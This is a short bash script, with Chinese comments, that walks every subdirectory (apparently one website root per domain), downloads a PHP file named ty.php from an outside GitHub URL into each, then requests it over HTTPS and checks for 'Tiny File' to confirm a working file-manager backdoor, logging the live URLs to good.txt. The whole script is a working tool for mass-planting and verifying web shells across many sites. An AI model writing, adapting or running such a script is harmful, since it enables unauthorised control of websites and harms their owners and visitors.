#!/bin/bash

base_dir="$(pwd)"
source_url="https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php"

for dir in */; do
    dirname=${dir%/}
    target_file="${base_dir}/${dirname}/ty.php"
    
    echo "========================================="
    echo "Checking $dirname..."
    echo "  Target path: $target_file"
    
    # 步骤1: 使用绝对路径下载文件到本地目录
    if wget -q "$source_url" -O "$target_file"; then
        if [ -f "$target_file" ] && [ -s "$target_file" ]; then
            echo "  ✓ Downloaded successfully"
            ls -lh "$target_file"
        else
            echo "  ✗ Download failed or file empty"
            continue
        fi
    else
        echo "  ✗ wget download failed"
        continue
    fi
    
    # 步骤2: 通过 HTTPS 访问并验证内容
    url="https://${dirname}/ty.php"
    echo "  Validating: $url"
    
    # 获取 HTTP 状态码和内容
    http_code=$(curl -s -k -o /tmp/ty_content.txt -w "%{http_code}" "$url")
    content=$(cat /tmp/ty_content.txt)
    
    # 步骤3: 严格验证
    if [ "$http_code" = "200" ] && echo "$content" | grep -q "Tiny File"; then
        echo "  ✓ VALID: HTTP $http_code, content verified"
        echo "$url" >> good.txt
    else
        echo "  ✗ INVALID: HTTP $http_code, content check failed"
        # 可选：记录失败原因
        echo "$url (HTTP $http_code)" >> invalid.txt
    fi
    
    rm -f /tmp/ty_content.txt
done

echo "========================================="
echo "Results saved to good.txt"
if [ -f invalid.txt ]; then
    echo "Invalid URLs saved to invalid.txt"
fi
